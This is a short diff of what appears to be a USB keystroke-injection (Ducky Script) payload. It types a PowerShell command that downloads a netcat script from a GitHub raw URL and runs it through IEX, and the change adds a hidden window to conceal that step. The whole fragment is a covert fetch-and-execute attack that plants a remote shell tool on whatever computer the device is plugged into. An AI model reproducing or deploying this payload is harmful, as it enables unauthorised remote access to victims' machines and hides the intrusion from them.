@@ -13,5 +13,5 @@ ENTER
 STRING cls
 ENTER
 
-powershell "$dd = (iwr 'https://raw.githubusercontent.com/toballz/j/master/pshell/netcat.ps1').content;IEX $dd;"
+STRING powershell -window hidden "$dd = (iwr 'https://raw.githubusercontent.com/toballz/j/master/pshell/netcat.ps1').content;IEX $dd;"
 ENTER
